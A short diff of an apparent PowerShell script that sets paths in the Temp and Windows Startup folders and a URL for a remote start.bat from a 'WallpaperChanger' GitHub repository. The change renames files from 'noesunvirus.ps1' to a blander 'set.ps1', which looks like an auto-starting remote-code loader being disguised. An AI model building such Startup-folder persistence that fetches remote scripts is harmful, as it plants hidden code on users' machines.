@@ -1,6 +1,6 @@
 $scriptPath1 = "$env:userprofile\AppData\Local\Temp\set.ps1"
-#$scriptPath2 = "$env:userprofile\Documents\noesunvirus.ps1"
-#$scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1"
+#$scriptPath2 = "$env:userprofile\Documents\set.ps1"
+#$scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\set.ps1"
 $batFilePath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
 $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"
 
